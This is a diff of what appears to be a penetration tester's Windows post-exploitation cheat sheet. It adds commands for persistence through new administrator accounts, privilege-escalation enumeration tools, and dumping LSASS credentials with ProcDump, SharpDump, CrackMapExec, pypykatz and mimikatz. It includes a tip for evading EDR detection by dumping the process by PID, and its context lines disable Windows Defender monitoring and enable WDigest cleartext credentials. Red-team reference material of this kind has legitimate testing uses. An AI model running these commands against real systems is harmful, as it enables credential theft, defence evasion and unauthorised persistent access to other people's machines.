@@ -29,37 +29,6 @@ net use \\target IP\ipc$ "" /u:""
 # CIFS Share Writable By Everyone
 
 Places > Network > Browse Network
-
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Firewall
-
-netsh firewall show state
-netsh firewall show config
-
-netsh firewall add portopening TCP 3389 RDP
-
-netsh firewall set opmode disable                 Disable firewall
-
-netsh wlan show interfaces
-netsh wlan show drivers
-netsh wlan show networks
-netsh wlan show profiles
-netsh wlan show profiles name="name"
-show profiles name="name" key=clear
-
-- Open RDP in the firewall, start the service and login
-
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh firewall set opmode disable
-sc config termservice start= auto
-
-rdesktop -u <user> -p <password> <target IP>
-rdesktop -u <user> -p <password> -g 1440x900 <target IP>         Set a larger window size than the default
-rdesktop -u <user> -p <password> -g 85% <target IP>              Set a smaller window size using a percentage of the default
-rdesktop -u <user> -p <password> -g 85% -r disk:share=/root/     <target IP>
-
-ctrl + alt + enter                                               Toggle full screen mode
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # NetBIOS and SMB
@@ -122,8 +91,8 @@ net localgroup                                    Local security groups
 net localgroup Administrators                     Users in the local Administrators security group
 net localgroup "Remote Desktop Users"             Users in the local Remote Desktop Users security group
 
-net user <user> <password> /add                   Add a new local user
-net localgroup HR /add                            Add a new local group
+net user <user> <password> /add                   Create a new local user
+net localgroup HR /add                            Create a new local security group
 net localgroup Administrators <user> /add         Add the new user to the local Administrators security group
 
 net view                                          Domains, computers, or resources that are being shared by the specified computer
@@ -188,7 +157,7 @@ Exclude the ‘C:\Windows’ path from scheduled and real-time scanning.
 
 try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}
 
-- Allow RDP
+- Allow RDP through the firewall
 netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
 
 - Start Remote Desktop Services
@@ -201,42 +170,93 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Privilege Escalation
+# Persistence
 
-OS configuration issues
-software configuration issues
-weak service permissions
-weak file system permissions
-DLL hijacking
+- Create a new local user
+net user <user> <password> /add
+net localgroup Administrators <user> /add
 
-PowerUp.ps1, Invoke-AllChecks
+- Autorun registry keys
 
-git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester
-cd Windows-Exploit-Suggester
-pip install xlrd --upgrade
-./windows-exploit-suggester.py --update (note the database file name)
-systeminfo > win.txt                              Run this on the Windows target and d/l to attack VM
-./windows-exploit-suggester.py --database 2020-01-18-mssb.xls --systeminfo win.txt
+- Scheduled task
 
-seatbelt.exe -group=system
-
-watson.exe
-
-winPEASx64.exe cmd
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Dump LSASS
+# Privilege Escalation
 
-Need to be running as admin.
+Tools will need to be transferred to the target.
 
-procdump -ma lsass.exe lsass_dump
+- C#
+/opt/SharpCollection/
+SharpUp.exe audit
 
-- Mimikatz
-sekurlsa::Minidump lsassdump.dmp
+- Executable
+/opt/SharpCollection/
+Seatbelt.exe -group=user
+Seatbelt.exe -group=system
+Seatbelt.exe -group=remote
+Watson.exe
+winPEAS.exe cmd
+
+- PowerShell
+/usr/share/windows-resources/powersploit/Privesc/
+powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
+
+/opt/PrivescCheck/
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+
+- Python
+/opt/Windows-Exploit-Suggester-NG
+./wes.py --update
+systeminfo > systeminfo.txt
+Transfer the file to Kali.
+./wes.py systeminfo.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Dump the LSASS (Local Security Authority Subsystem Service) process
+
+This contains NTLM hashes of Windows credentials of users who have logged into the computer.
+They can be brute forced offline for cleartext passwords or used in a pass-the-hash attack for lateral movement.
+In order to dump LSASS, SEDebugPrivilege must be enabled: whoami /priv
+Need to be running from an admin Command Prompt.
+
+- Check if Credential Guard is configured and running
+$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
+if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
+if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}
+
+- GUI access
+Open the Task Manager > Details > right click on lsass.exe > Create dump file
+
+- ProcDump
+curl https://live.sysinternals.com/tools/procdump.exe  -o procdump.exe
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+Some EDR solutions will alert or block this based on the “lsass” process name. This can usually be bypassed by specifying the LSASS process ID instead.
+tasklist | findstr lsass
+procdump.exe -accepteula -ma <PID> lsass.dmp
+
+Transfer dump to Kali VM, then use pypykatz to extract the stored credentials and hashes.
+pypykatz lsa dump lsass.dmp
+
+- CME
+crackmapexec smb <target IP> -u <admin user> -p <password> --lsa
+Output stored in ~/.cme/logs/
+
+-SharpDump
+/opt/SharpCollection/NetFramework_4.7_x64/SharpDump.exe
+Transfer file to target.
+SharpDump.exe
+Transfer dump to Windows VM.
+Rename debug<PID>.bin to debug<PID>.gz
+mimikatz.exe
+sekurlsa::minidump C:\Users\joe\debug<PID>
 sekurlsa::logonPasswords
 
-- Built-in tools
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\test.dmp full | out-host; Compress-Archive C:\windows\temp\test.dmp C:\windows\temp\test.zip
+- mimikatz.exe
+sekurlsa::minidump lsass.dmp
+log lsass.txt
+sekurlsa::logonPasswords
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral Movement
